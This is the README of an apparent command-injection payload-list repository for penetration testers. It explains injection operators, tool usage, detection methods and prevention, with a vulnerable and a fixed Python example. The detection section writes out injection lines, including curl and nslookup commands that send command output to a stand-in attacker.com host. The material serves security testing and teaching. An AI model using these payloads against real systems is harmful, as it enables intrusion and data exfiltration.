# Command Injection Payload List

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Maintained: Yes](https://img.shields.io/badge/Maintained-Yes-green.svg)](https://github.com/payload-box/command-injection-payload-list)

A comprehensive collection of command injection payloads for security testing and penetration testing purposes. This repository contains various command injection techniques targeting different operating systems and scenarios.

## 📚 Additional Documentation

- **[Quick Start Guide](QUICK_START.md)** - Get started in under 5 minutes
- **[Cheat Sheet](CHEAT_SHEET.md)** - Quick reference for techniques and commands
- **[Contributing Guidelines](CONTRIBUTING.md)** - How to contribute to this project
- **[Project Summary](SUMMARY.md)** - Complete overview with statistics

## 📋 Table of Contents

- [Overview](#overview)
- [Payload Categories](#payload-categories)
- [Installation](#installation)
- [Usage](#usage)
  - [With Burp Suite](#with-burp-suite)
  - [With OWASP ZAP](#with-owasp-zap)
  - [Manual Testing](#manual-testing)
- [Payload Files](#payload-files)
- [Command Injection Basics](#command-injection-basics)
- [Detection Techniques](#detection-techniques)
- [Prevention and Mitigation](#prevention-and-mitigation)
- [Contributing](#contributing)
- [Disclaimer](#disclaimer)
- [License](#license)

## 🎯 Overview

Command injection is a security vulnerability that allows an attacker to execute arbitrary commands on the host operating system via a vulnerable application. This repository provides a curated list of payloads organized by technique and platform to assist security professionals in identifying and testing for command injection vulnerabilities.

## 📦 Payload Categories

This repository includes the following payload categories:

- **Basic Command Injection**: Common command injection patterns using various operators
- **Time-Based Command Injection**: Payloads for blind command injection detection using time delays
- **Encoded Payloads**: URL-encoded and obfuscated command injection attempts
- **Obfuscated Payloads**: Advanced evasion techniques using shell features
- **Windows-Specific**: Payloads targeting Windows Command Prompt and PowerShell
- **Linux/Unix-Specific**: Payloads designed for Linux and Unix-based systems
- **Data Exfiltration**: Commands for extracting sensitive information
- **Bypass Techniques**: Filter and WAF evasion methods

## 🚀 Installation

Clone this repository to your local machine:

```bash
git clone https://github.com/payload-box/command-injection-payload-list.git
cd command-injection-payload-list
```

## 💻 Usage

### With Burp Suite

1. Open Burp Suite and navigate to the Intruder tab
2. Configure your target and injection point
3. Click on "Payloads" tab
4. Under "Payload Options", click "Load"
5. Select the appropriate payload file from the `Intruder/` directory
6. Configure payload processing if needed
7. Start the attack

### With OWASP ZAP

1. Open OWASP ZAP and intercept the request
2. Right-click on the request and select "Fuzz"
3. Highlight the injection point
4. Click "Add" under Payloads
5. Select "File" as the payload type
6. Choose the appropriate payload file from the `Intruder/` directory
7. Start the fuzzer

### Manual Testing

You can manually test command injection vulnerabilities by copying payloads from the files and injecting them into:

- URL parameters
- POST data fields
- HTTP headers
- File upload functionalities
- Cookie values
- API endpoints

## 📁 Payload Files

| File Name | Description | Payload Count |
|-----------|-------------|---------------|
| `command-injection-basic.txt` | Basic command injection using common operators (`;`, `|`, `||`, `&`, `&&`, backticks, `$()`) | 105 |
| `command-injection-time-based.txt` | Time-based blind injection using `sleep`, `ping`, and `timeout` commands | 130 |
| `command-injection-encoded.txt` | URL-encoded and special character encoded payloads | 99 |
| `command-injection-obfuscated.txt` | Obfuscated payloads using shell variables, wildcards, and advanced techniques | 138 |
| `command-injection-windows.txt` | Windows-specific commands including CMD and PowerShell | 179 |
| `command-injection-linux.txt` | Linux/Unix-specific commands and utilities | 220 |
| `command-injection-data-exfiltration.txt` | Payloads for extracting sensitive data | 150 |
| `command-injection-bypass.txt` | Filter evasion and WAF bypass techniques | 202 |
| `command-injection-out-of-band.txt` | Out-of-band data exfiltration and reverse shell payloads | 203 |
| `command-injection-special-chars.txt` | Special characters, edge cases, and delimiter variations | 187 |
| `command-injection-polyglot.txt` | Polyglot payloads and context-breaking techniques | 223 |

## 🔍 Command Injection Basics

### Common Injection Operators

- **Semicolon (`;`)**: Executes commands sequentially
  ```
  command1; command2
  ```

- **Pipe (`|`)**: Passes output of one command to another
  ```
  command1 | command2
  ```

- **OR (`||`)**: Executes second command if first fails
  ```
  command1 || command2
  ```

- **Ampersand (`&`)**: Runs command in background
  ```
  command1 & command2
  ```

- **AND (`&&`)**: Executes second command only if first succeeds
  ```
  command1 && command2
  ```

- **Backticks (`` ` ``)**: Command substitution
  ```
  `command`
  ```

- **Dollar Parentheses (`$()`)**: Command substitution (POSIX)
  ```
  $(command)
  ```

### Platform Differences

**Linux/Unix**:
- Uses `/bin/sh`, `/bin/bash`, or other shells
- Sensitive files: `/etc/passwd`, `/etc/shadow`, `/etc/hosts`
- Common commands: `ls`, `cat`, `id`, `whoami`, `uname`

**Windows**:
- Uses `cmd.exe` or PowerShell
- Sensitive files: `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`
- Common commands: `dir`, `type`, `whoami`, `systeminfo`, `net user`

## 🔎 Detection Techniques

### 1. Direct Output Detection
Look for command output directly in the response:
```
; whoami
| id
```

### 2. Time-Based Detection
Measure response time delays:
```
; sleep 10
| ping -c 10 127.0.0.1
```

### 3. Out-of-Band Detection
Trigger external connections:
```
; curl http://attacker.com/?data=$(whoami)
; nslookup $(whoami).attacker.com
```

### 4. Error-Based Detection
Analyze error messages for command execution indicators:
```
; cat /nonexistent
| invalid-command
```

## 🛡️ Prevention and Mitigation

### For Developers

1. **Input Validation**: Never trust user input; validate and sanitize all data
2. **Avoid System Calls**: Use built-in language features instead of executing system commands
3. **Parameterization**: Use parameterized APIs that separate commands from data
4. **Whitelist Approach**: Only allow specific, expected values
5. **Principle of Least Privilege**: Run applications with minimal necessary permissions
6. **Escaping**: Properly escape special characters if system calls are unavoidable
7. **Use Safe APIs**: Utilize language-specific safe execution methods

### Example Safe Code (Python)

**Vulnerable**:
```python
import os
filename = request.GET['filename']
os.system('cat ' + filename)  # DANGEROUS!
```

**Secure**:
```python
import subprocess
filename = request.GET['filename']
# Validate filename
if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
    raise ValueError('Invalid filename')
# Use list-based arguments
subprocess.run(['cat', filename], check=True)
```

### For Security Testers

- Always obtain proper authorization before testing
- Test in isolated environments when possible
- Document all findings thoroughly
- Avoid destructive payloads in production systems
- Follow responsible disclosure practices

## 🤝 Contributing

Contributions are welcome! If you have additional payloads or improvements:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/new-payloads`)
3. Add your payloads to the appropriate file(s)
4. Commit your changes (`git commit -am 'Add new obfuscation techniques'`)
5. Push to the branch (`git push origin feature/new-payloads`)
6. Create a Pull Request

Please ensure:
- Payloads are tested and functional
- Each payload is on a new line
- Duplicates are avoided
- Documentation is updated accordingly

## ⚠️ Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY**

This repository is intended for:
- Security researchers
- Penetration testers
- Bug bounty hunters
- Security professionals
- Educational purposes

**Important Legal Notice**:
- Unauthorized access to computer systems is illegal
- Only test on systems you own or have explicit permission to test
- The contributors and maintainers are not responsible for any misuse
- Users are solely responsible for their actions
- Always comply with local, state, and federal laws

Misuse of this information may result in criminal charges. Use responsibly and ethically.

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- OWASP Testing Guide
- PortSwigger Web Security Academy
- HackTricks
- PayloadsAllTheThings
- Security research community

## 📚 Related Documentation

- **[QUICK_START.md](QUICK_START.md)** - Beginner-friendly guide to get started quickly
- **[CHEAT_SHEET.md](CHEAT_SHEET.md)** - Command injection techniques reference
- **[CONTRIBUTING.md](CONTRIBUTING.md)** - Guidelines for contributors
- **[SUMMARY.md](SUMMARY.md)** - Project statistics and overview

## 📞 Contact

- **GitHub Issues**: [Report Issues](https://github.com/payload-box/command-injection-payload-list/issues)
- **Pull Requests**: [Submit PRs](https://github.com/payload-box/command-injection-payload-list/pulls)

---

**Stay ethical, stay legal, and happy testing! 🔒**